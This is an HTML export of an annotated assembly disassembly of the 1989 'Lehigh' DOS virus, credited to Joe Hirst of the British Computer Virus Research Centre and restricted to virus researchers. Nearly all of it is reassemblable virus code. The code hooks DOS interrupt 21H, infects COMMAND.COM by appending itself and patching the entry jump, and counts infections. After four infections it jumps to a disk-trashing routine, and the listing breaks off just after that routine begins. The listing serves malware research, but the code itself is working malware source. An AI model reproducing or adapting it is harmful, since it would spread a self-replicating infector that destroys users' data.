<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">    </span><span class="sc9">page</span><span class="sc0">    </span><span class="sc2">65</span><span class="sc4">,</span><span class="sc2">132</span><span class="sc0">
    </span><span class="sc9">title</span><span class="sc0">   </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc12">'Lehigh'</span><span class="sc0"> </span><span class="sc5">Virus</span><span class="sc0">
</span><span class="sc1">; ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป</span><span class="sc0">
</span><span class="sc1">; บ                 British Computer Virus Research Centre                   บ</span><span class="sc0">
</span><span class="sc1">; บ  12 Guildford Street,   Brighton,   East Sussex,   BN1 3LS,   England    บ</span><span class="sc0">
</span><span class="sc1">; บ  Telephone:     Domestic   0273-26105,   International  +44-273-26105    บ</span><span class="sc0">
</span><span class="sc1">; บ                                                                          บ</span><span class="sc0">
</span><span class="sc1">; บ                            The 'Lehigh' Virus                            บ</span><span class="sc0">
</span><span class="sc1">; บ                Disassembled by Joe Hirst,   July     1989                บ</span><span class="sc0">
</span><span class="sc1">; บ                                                                         บ</span><span class="sc0">
</span><span class="sc1">; บ                       Copyright (c) Joe Hirst 1989.                      บ</span><span class="sc0">
</span><span class="sc1">; บ                                                                          บ</span><span class="sc0">
</span><span class="sc1">; บ      This listing is only to be made available to virus researchers      บ</span><span class="sc0">
</span><span class="sc1">; บ                or software writers on a need-to-know basis.              บ</span><span class="sc0">
</span><span class="sc1">; ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ</span><span class="sc0">

    </span><span class="sc1">; The disassembly has been tested by re-assembly using MASM 5.0.</span><span class="sc0">

</span><span class="sc5">CODE</span><span class="sc0">    </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">

    </span><span class="sc1">; Interrupt 21H routine</span><span class="sc0">

</span><span class="sc5">BP0010</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4BH</span><span class="sc0">          </span><span class="sc1">; Load function?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0020</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4EH</span><span class="sc0">          </span><span class="sc1">; Find file file?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0020</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0170</span><span class="sc0">          </span><span class="sc1">; Pass interrupt on</span><span class="sc0">

    </span><span class="sc1">; Load or find file function</span><span class="sc0">

</span><span class="sc5">BP0020</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Get pathname pointer</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">':'</span><span class="sc0"> </span><span class="sc1">; Is a disk specified?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0030</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get disk letter</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0040</span><span class="sc0">

    </span><span class="sc1">; Is there a COMMAND.COM on disk?</span><span class="sc0">

</span><span class="sc5">BP0030</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">19H</span><span class="sc0">          </span><span class="sc1">; Get current disk function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">44H</span><span class="sc0">         </span><span class="sc1">; DOS service (diverted INT 21H)</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc0">          </span><span class="sc1">; Convert to letter</span><span class="sc0">
</span><span class="sc5">BP0040</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set DS to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">PATHNM</span><span class="sc0">    </span><span class="sc1">; Address pathname</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">         </span><span class="sc1">; Store disk letter in pathname</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; Move pathname address</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3D02H</span><span class="sc0">        </span><span class="sc1">; Open handle (R/W) function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">44H</span><span class="sc0">         </span><span class="sc1">; DOS service (diverted INT 21H)</span><span class="sc0">
    </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">BP0050</span><span class="sc0">          </span><span class="sc1">; Branch if no error</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0160</span><span class="sc0">          </span><span class="sc1">; Restore registers and terminate</span><span class="sc0">

    </span><span class="sc1">; Is COMMAND.COM infected?</span><span class="sc0">

</span><span class="sc5">BP0050</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; Move file handle</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4202H</span><span class="sc0">        </span><span class="sc1">; Move file pointer function (EOF)</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; \ No offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">44H</span><span class="sc0">         </span><span class="sc1">; DOS service (diverted INT 21H)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; Copy file length</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">FILELN</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Save file length</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; Address last word of file</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">        </span><span class="sc1">; Move file pointer function (start)</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">44H</span><span class="sc0">         </span><span class="sc1">; DOS service (diverted INT 21H)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BUFFER</span><span class="sc0">    </span><span class="sc1">; Address read buffer</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; Length to read</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">          </span><span class="sc1">; Read handle function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">44H</span><span class="sc0">         </span><span class="sc1">; DOS service (diverted INT 21H)</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">BUFFER</span><span class="sc4">,</span><span class="sc2">65A9H</span><span class="sc0">   </span><span class="sc1">; Is file infected?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0060</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0080</span><span class="sc0">

    </span><span class="sc1">; Infect COMMAND.COM</span><span class="sc0">

</span><span class="sc5">BP0060</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; \ No offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">        </span><span class="sc1">; Move file pointer function (start)</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">44H</span><span class="sc0">         </span><span class="sc1">; DOS service (diverted INT 21H)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Length to read</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BUFFER</span><span class="sc0">    </span><span class="sc1">; Address read buffer</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Copy address</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">          </span><span class="sc1">; Read handle function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">44H</span><span class="sc0">         </span><span class="sc1">; DOS service (diverted INT 21H)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get displacement from initial jump</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0103H</span><span class="sc0">        </span><span class="sc1">; Convert to address for COM file</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">ENTPTR</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Save file entry address</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">FILELN</span><span class="sc0">       </span><span class="sc1">; Get file length</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDADR</span><span class="sc0">    </span><span class="sc1">; Subtract length of virus</span><span class="sc0">
    </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">          </span><span class="sc1">; ...and one more</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">         </span><span class="sc1">; Put offset into jump instruction</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; Clear high offset for move</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">        </span><span class="sc1">; Move file pointer function (start)</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">44H</span><span class="sc0">         </span><span class="sc1">; DOS service (diverted INT 21H)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">INFCNT</span><span class="sc0">       </span><span class="sc1">; Get infection count</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; Preserve infection count</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">INFCNT</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; Set infection count to zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDADR</span><span class="sc0">    </span><span class="sc1">; \ Get length of virus</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Address start of virus</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">          </span><span class="sc1">; Write handle function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">44H</span><span class="sc0">         </span><span class="sc1">; DOS service (diverted INT 21H)</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; Recover infection count</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">INFCNT</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">       </span><span class="sc1">; Restore original infection count</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; \ Address second byte of program</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">        </span><span class="sc1">; Move file pointer function (start)</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">44H</span><span class="sc0">         </span><span class="sc1">; DOS service (diverted INT 21H)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get virus offset</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0180</span><span class="sc0">    </span><span class="sc1">; Add entry point</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Subtract length of jump instruction</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; Replace offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">           </span><span class="sc1">; Address stored offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; Length to write</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">          </span><span class="sc1">; Write handle function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">44H</span><span class="sc0">         </span><span class="sc1">; DOS service (diverted INT 21H)</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">INFCNT</span><span class="sc0">     </span><span class="sc1">; Increment infection count</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">INFCNT</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">   </span><span class="sc1">; Have we reached target?</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0070</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0110</span><span class="sc0">          </span><span class="sc1">; Trash disk</span><span class="sc0">

    </span><span class="sc1">; Is disk A or B?</span><span class="sc0">

</span><span class="sc5">BP0070</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">N_AORB</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; Set off "not A or B" switch</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">CURDSK</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">   </span><span class="sc1">; Is current disk A or B?</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0080</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">N_AORB</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; Set on "not A or B" switch</span><span class="sc0">
</span><span class="sc5">BP0080</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc0">          </span><span class="sc1">; Close handle function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">44H</span><span class="sc0">         </span><span class="sc1">; DOS service (diverted INT 21H)</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">N_AORB</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; Is "not A or B" switch on?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0090</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0160</span><span class="sc0">          </span><span class="sc1">; Restore registers and terminate</span><span class="sc0">

    </span><span class="sc1">; Disk not A or B</span><span class="sc0">

</span><span class="sc5">BP0090</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">N_AORB</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; Set off "not A or B" switch</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">PATHNM</span><span class="sc0">    </span><span class="sc1">; Address pathname</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">CURDSK</span><span class="sc0">       </span><span class="sc1">; Get current disk</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc0">          </span><span class="sc1">; Convert to letter</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">         </span><span class="sc1">; Store letter in pathname</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; Move pathname address</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3D02H</span><span class="sc0">        </span><span class="sc1">; Open handle (R/W) function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">44H</span><span class="sc0">         </span><span class="sc1">; DOS service (diverted INT 21H)</span><span class="sc0">
    </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">BP0100</span><span class="sc0">          </span><span class="sc1">; Branch if no error</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0160</span><span class="sc0">          </span><span class="sc1">; Restore registers and terminate</span><span class="sc0">

    </span><span class="sc1">; Set infection count same as in current program</span><span class="sc0">

</span><span class="sc5">BP0100</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4202H</span><span class="sc0">        </span><span class="sc1">; Move file pointer function (EOF)</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; \ No offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">44H</span><span class="sc0">         </span><span class="sc1">; DOS service (diverted INT 21H)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; \ Address back to infection count</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">        </span><span class="sc1">; Move file pointer function (start)</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">44H</span><span class="sc0">         </span><span class="sc1">; DOS service (diverted INT 21H)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Length to write</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">INFCNT</span><span class="sc0">    </span><span class="sc1">; Address infection count</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">          </span><span class="sc1">; Write handle function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">44H</span><span class="sc0">         </span><span class="sc1">; DOS service (diverted INT 21H)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc0">          </span><span class="sc1">; Close handle function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">44H</span><span class="sc0">         </span><span class="sc1">; DOS service (diverted INT 21H)</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0160</span><span class="sc0">          </span><span class="sc1">; Restore registers and terminate</span><span class="sc0">

    </span><span class="sc1">; Trash disk</span><span class="sc0">

</span><span class="sc5">BP0110</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">CURDSK</span><span class="sc0">       </span><span class="sc1">; Get current disk</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; Is disk A or B?</span><span class="sc0">
    </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">BP0150</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">19H</span><span class="sc0">          </span><span class="sc1">; Get current disk function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">44H</span><span class="sc0">         </span><span class="sc1">; DOS service (diverted INT 21H)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">PATHNM</span><span class="sc0">    </span><span class="sc1">; Address pathname</span><span class="sc0">
